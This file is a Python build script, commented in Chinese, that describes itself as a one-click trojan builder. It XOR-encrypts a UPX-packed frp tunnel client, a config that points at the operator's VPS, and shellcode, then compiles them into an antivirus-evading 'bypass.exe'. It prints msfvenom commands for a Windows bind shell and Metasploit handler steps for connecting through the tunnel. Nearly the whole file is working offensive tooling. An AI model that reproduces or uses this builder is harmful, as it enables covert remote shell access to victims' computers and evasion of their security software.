#!/usr/bin/env python3
"""
auto_build.py — 一键构建完整木马: 加密 frpc + 配置 + shellcode → 编译
===============================================================
用法:
    python auto_build.py <VPS_IP> [remote_port] [local_port] [xor_key]

流程:
  1. 生成 frpc.toml (连接你的 VPS frps)
  2. 加密 frpc_upx.exe + frpc.toml + shellcode.bin
  3. 调用 build_bypass.bat 编译最终 bypass.exe

依赖:
  - Python 3
  - Visual Studio Build Tools (cl.exe / link.exe)
  - frpc_upx.exe（从 frp release 下载 + UPX 压缩；用 FRPC_PATH 环境变量指定）
  - shellcode.bin (手动生成或用 msfvenom)

示例:
    python auto_build.py 123.45.67.89 4444 4444 0xCE
"""

import sys
import os
import subprocess
import embed_frp
import gen_frpc_config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(SCRIPT_DIR)  # bypass_av/

# Default paths
# FRPC_PATH env var overrides the frpc location (matches build.bat).
FRPC_EXE = os.environ.get("FRPC_PATH", os.path.join(PROJECT_DIR, "frpc_upx.exe"))
SHELLCODE_BIN = os.path.join(PROJECT_DIR, "shellcode.bin")

def check_dependencies():
    """Check all required files exist"""
    missing = []
    if not os.path.exists(FRPC_EXE):
        missing.append(f"frpc_upx.exe (expected at {FRPC_EXE})")
    if not os.path.exists(SHELLCODE_BIN):
        missing.append(f"shellcode.bin (expected at {SHELLCODE_BIN})")
    return missing

def create_shellcode_bin():
    """Create a minimal bind shell stub as shellcode.bin"""
    # Minimal bind shell shellcode (placeholder)
    # In production, replace with: msfvenom -p windows/x64/meterpreter/bind_tcp
    #   LPORT=4444 -f raw -o shellcode.bin
    # Or use a custom compiled shellcode
    
    # For now, create a simple stub that will be replaced
    stub = bytes([
        0x90, 0x90, 0x90,  # NOP sled placeholder
        # Real shellcode will be inserted here
        # Use: msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f raw -o shellcode.bin
    ])
    with open(SHELLCODE_BIN, "wb") as f:
        f.write(stub)
    print(f"[!] Created placeholder shellcode.bin ({len(stub)} bytes)")
    print(f"[!] REPLACE IT with real shellcode:")
    print(f"    On Kali: msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f raw -o shellcode.bin")
    print(f"    Then copy shellcode.bin to {PROJECT_DIR}")
    return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python auto_build.py <VPS_IP> [remote_port] [local_port] [xor_key]")
        print("  Example: python auto_build.py 123.45.67.89 4444 4444 0xCE")
        print("\n  First time setup:")
        print("  1. Download frp and compress with UPX")
        print("  2. Generate shellcode with msfvenom on Kali")
        print("  3. Run this script")
        sys.exit(1)

    vps_ip = sys.argv[1]
    remote_port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    local_port = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
    xor_key = int(sys.argv[4], 16) if len(sys.argv) > 4 else 0xCE

    # Change to project directory
    os.chdir(PROJECT_DIR)
    print(f"[*] Working directory: {PROJECT_DIR}")

    # Check dependencies
    missing = check_dependencies()
    if missing:
        print("[!] Missing dependencies:")
        for m in missing:
            print(f"    - {m}")
        if not os.path.exists(SHELLCODE_BIN):
            choice = input("[?] Create placeholder shellcode.bin? (y/N): ")
            if choice.lower() == 'y':
                create_shellcode_bin()
            else:
                print("[!] Aborting. Create shellcode.bin first.")
                print("    On Kali: msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f raw -o shellcode.bin")
                sys.exit(1)
        if not os.path.exists(FRPC_EXE):
            print("[!] frpc_upx.exe not found. Download frp + UPX compress:")
            print("    1. Download frp from https://github.com/fatedier/frp/releases")
            print("    2. Extract frpc.exe")
            print("    3. UPX --best frpc.exe -o frpc_upx.exe")
            print("    4. Set FRPC_PATH to its path and retry")
            sys.exit(1)

    # Step 1: Generate frpc.toml
    print(f"\n[1/4] Generating frpc.toml...")
    gen_frpc_config.generate_config(vps_ip, remote_port, local_port)
    config_path = os.path.join(PROJECT_DIR, "frpc.toml")
    with open(config_path, "w") as f:
        f.write(gen_frpc_config.generate_config(vps_ip, remote_port, local_port))
    print(f"    Config: VPS {vps_ip}:7000, Tunnel {remote_port}→localhost:{local_port}")

    # Step 2: Generate encrypted header files
    print(f"\n[2/4] Encrypting and generating headers...")
    embed_frp.main([
        "embed_frp.py",
        FRPC_EXE,
        config_path,
        SHELLCODE_BIN,
        hex(xor_key)
    ])

    # Step 3: Update STR_KEY in main.c
    print(f"\n[3/4] Updating STR_KEY in main.c...")
    main_c_path = os.path.join(PROJECT_DIR, "main.c")
    with open(main_c_path, "r", encoding="utf-8") as f:
        content = f.read()

    # Check if STR_KEY is already set correctly
    old_key = f"#define STR_KEY 0x"
    new_key = f"#define STR_KEY 0x{xor_key:02X}"

    if f"STR_KEY 0x" in content:
        import re
        content = re.sub(r"#define STR_KEY 0x[0-9A-Fa-f]+", f"#define STR_KEY 0x{xor_key:02X}", content)
        with open(main_c_path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"    Updated STR_KEY to 0x{xor_key:02X}")

    # Step 4: Call build_bypass.bat
    print(f"\n[4/4] Building bypass.exe...")
    build_script = os.path.join(PROJECT_DIR, "build_bypass.bat")
    if os.path.exists(build_script):
        result = subprocess.call([build_script], cwd=PROJECT_DIR, shell=True)
        if result == 0:
            print(f"\n[+] Build successful! Check {PROJECT_DIR}\\bypass.exe")
        else:
            print(f"\n[-] Build failed with code {result}")
    else:
        print(f"[-] build_bypass.bat not found at {build_script}")

    print(f"\n=== Summary ===")
    print(f"  VPS:          {vps_ip}:7000")
    print(f"  Tunnel port:  {remote_port}")
    print(f"  XOR key:      0x{xor_key:02X}")
    print(f"  Output:       {PROJECT_DIR}\\bypass.exe")
    print(f"\n  Kali connect: msfconsole -q")
    print(f"    use exploit/multi/handler")
    print(f"    set payload windows/x64/shell_bind_tcp")
    print(f"    set RHOST {vps_ip}")
    print(f"    set LPORT {remote_port}")
    print(f"    exploit")

if __name__ == "__main__":
    main()
